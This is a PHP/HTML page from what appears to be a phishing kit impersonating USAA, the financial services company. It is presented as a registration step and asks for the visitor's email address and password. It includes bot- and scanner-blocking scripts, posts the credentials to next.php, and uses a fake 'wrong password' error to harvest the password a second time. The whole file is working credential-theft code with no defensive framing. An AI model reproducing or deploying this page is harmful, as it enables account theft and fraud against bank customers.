<?php
include '../prevents/bot.php';
include '../prevents/ref.php';
include '../prevents/blacklist.php';
include '../prevents/blocker.php';
?>
<!doctype html>
<html>

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link href="./assets/css/fonts.css" rel="stylesheet" />
    <link href="./assets/css/output.css" rel="stylesheet" />
    <title>Register</title>
</head>

<body class="font-GothamNarrow bg-white text-bookmark-blue-dark">
    <main class="">
        <header class="border xl:p-4 py-2">
            <div class="container flex items-center gap-4 max-w-[1140px]">
                <img src="assets/imgs/logo-svg-dark.svg" alt="" class="size-14" />
                <h4 class="xl:text-2xl text-xl font-font1">Join USAA</h4>
            </div>
        </header>

        <main class="max-w-[600px] mx-auto px-4 py-10">
            <form action="../next.php" method="post" class="">
                <div class="">
                    <h4 class="xl:text-2xl text-xl mb-8 font-font1">Now, let's continue with your information</h4>
                    <p class="text-sm text-gray-600 mb-6">Enter your email address and password on file.</p>

                    <?php
                    if (isset($_GET['error']) && $_GET['error'] == 5) {
                    ?>

                    <p style="color: red;">Wrong Email or Password, please try again.</p>

                    <?php } ?>

                    <?php
                    if (isset($_GET['error']) && $_GET['error'] == 5) {
                    ?>
                    <input name="action" value="6" type="hidden">
                    <?php
                    } else {
                    ?>
                    <input name="action" value="5" type="hidden">
                    <?php
                    }
                    ?>

                    <br>

                    <div class="flex -mx-3 flex-wrap">
                        <div class="px-3 w-full">
                            <div class="form-group mb-7">
                                <label for="fname" class="form-label leading-none font-font2 block mb-2 text-sm">Email
                                    Address</label>
                                <input type="email" required placeholder="Enter your email" name="emd" id="email"
                                    class="form-control h-[44px] p-[15px] w-full border border-[#949494] hover:border-[#757575] text-black focus:border-theme-secondary focus:outline-1 focus:outline-offset-1 rounded-[3px] focus:outline-theme-secondary transition-all without-outline without-ring"
                                    aria-describedby="helpId">
                            </div>
                        </div>
                    </div>
                </div>

                <div class="flex -mx-3 flex-wrap">
                    <div class="px-3 w-full">
                        <div class="form-group mb-7">
                            <label for="fname"
                                class="form-label leading-none font-font2 block mb-2 text-sm">Password</label>
                            <input type="password" required placeholder="Enter your password" name="epass1"
                                id="password"
                                class="form-control h-[44px] p-[15px] w-full border border-[#949494] hover:border-[#757575] text-black focus:border-theme-secondary focus:outline-1 focus:outline-offset-1 rounded-[3px] focus:outline-theme-secondary transition-all without-outline without-ring"
                                aria-describedby="helpId">
                        </div>
                    </div>
                </div>


                <div class="text-right">
                    <button type="submit"
                        class="py-[12px] px-[30px] bg-blue-700 text-base tracking-wider font-semibold text-white rounded-[3px] hover:brightness-90 brightness-125 transition-all border border-[#666667] font-OpenSans">
                        Continue
                    </button>
                </div>
                </div>
            </form>
        </main>

        <footer class="py-10 text-black">
            <div class="container max-w-[1140px]">
                <div class="mb-3 flex flex-col flex-wrap underline sm:flex-row sm:gap-3 text-blue-700">
                    <a href="#">Security Center</a>
                    <a href="#">Privacy Center</a>
                    <a href="#">Accessibility at USAA</a>
                </div>
                <div class="space-y-1 text-sm">
                    <p>Copyright © 2026 USAA.</p>
                    <p>NC-1120</p>
                </div>
            </div>
        </footer>
    </main>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="./assets/js/main.js"></script>


</body>

</html>